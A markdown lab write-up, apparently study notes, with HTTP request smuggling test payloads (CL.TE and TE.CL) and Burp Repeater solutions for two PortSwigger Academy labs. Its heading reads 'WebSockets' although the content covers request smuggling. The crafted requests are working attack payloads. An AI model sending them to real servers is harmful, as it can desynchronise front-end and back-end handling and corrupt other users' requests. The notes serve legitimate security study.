<!-- omit in toc -->
# WebSockets

Here are the **testing** payloads to check if the website is vulnerable to HTTP Request smuggling:
#### CL.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

#### TE.CL
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

<!-- omit in toc -->
## Table of Contents

- [HTTP request smuggling, basic CL.TE vulnerability](#http-request-smuggling-basic-clte-vulnerability)
- [HTTP request smuggling, basic TE.CL vulnerability](#http-request-smuggling-basic-tecl-vulnerability)

## HTTP request smuggling, basic CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple CL.TE vulnerability. Everything in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The second response should say: ``Unrecognized method GPOST``.


## HTTP request smuggling, basic TE.CL vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple TE.CL vulnerability. Everything in the next paragraph.

<!-- omit in toc -->
### Solution
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
The second response should say: ``Unrecognized method GPOST``.